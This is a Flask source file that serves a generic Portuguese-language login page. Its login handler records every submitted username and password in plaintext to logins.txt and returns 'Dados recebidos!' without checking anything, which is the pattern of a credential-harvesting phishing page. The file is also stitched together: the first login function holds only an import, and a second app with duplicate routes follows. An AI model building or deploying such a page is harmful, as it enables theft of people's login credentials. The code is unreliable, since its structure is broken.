from flask import Flask, request, render_template_string

app = Flask(__name__)

html = """
<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8">
<title>Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
* { box-sizing: border-box; margin:0; padding:0; }

body { 
    font-family: Arial, sans-serif; 
    background: #f2f2f2; 
    display: flex; 
    justify-content: center; 
    align-items: center; 
    min-height: 100vh; 
    padding: 20px;
}

.login-box { 
    width: 100%;
    max-width: 360px;  
    padding: 20px; 
    background: #fff; 
    border-radius: 8px; 
    box-shadow: 0 0 15px rgba(0,0,0,0.2); 
    text-align: center;
}

.login-box img { 
    width: 120px;       
    height: auto;       
    margin-bottom: 15px;
}

input { 
    width: 100%; 
    padding: 12px; 
    margin: 8px 0; 
    border: 1px solid #ccc; 
    border-radius: 5px;
    font-size: 16px;
}

button { 
    width: 100%; 
    padding: 12px; 
    margin-top: 12px; 
    cursor: pointer; 
    font-size: 16px;
    border-radius: 5px;
    border: none;
}

button[type="submit"] {
    background-color: #007BFF;  /* Azul */
    color: #fff;
}

.create { 
    background: #4CAF50; 
    color: #fff;
}

a { 
    display: block; 
    margin-top: 12px; 
    color: #333; 
    text-decoration: none;
    font-size: 14px;
}

hr { 
    margin: 15px 0; 
    border: 0;
    border-top: 1px solid #ccc;
}

@media (max-width: 400px) {
    .login-box { padding: 15px; }
    input, button { padding: 10px; font-size: 14px; }
    .login-box img { width: 80px; }
}
</style>
</head>
<body>
<div class="login-box">
    <img src="/logo" alt="Logo">
    <form action="/login" method="POST">
        <input type="text" name="user" placeholder="Usuário">
        <input type="password" name="pass" placeholder="Palavra-passe">
        <button type="submit">Entrar</button>
    </form>
    <a href="#">Esqueceu a palavra-passe?</a>
    <hr>
    <button class="create">Criar nova conta</button>
</div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(html)

@app.route('/logo')
def logo():
    # Busca a imagem dentro da pasta static
    with open("static/images.png", "rb") as f:
        return f.read(), 200, {'Content-Type': 'image/png'}

@app.route('/login', methods=['POST'])
def login():
    from flask import Flask, request, redirect

app = Flask(__name__)

@app.route('/')
def index():
    return open("index.html").read()

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('user')
    password = request.form.get('pass')

    # Guardar no arquivo
    with open("logins.txt", "a") as f:
        f.write(f"Usuário: {user} | Senha: {password}\n")

    return "<h3>Dados recebidos!</h3>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
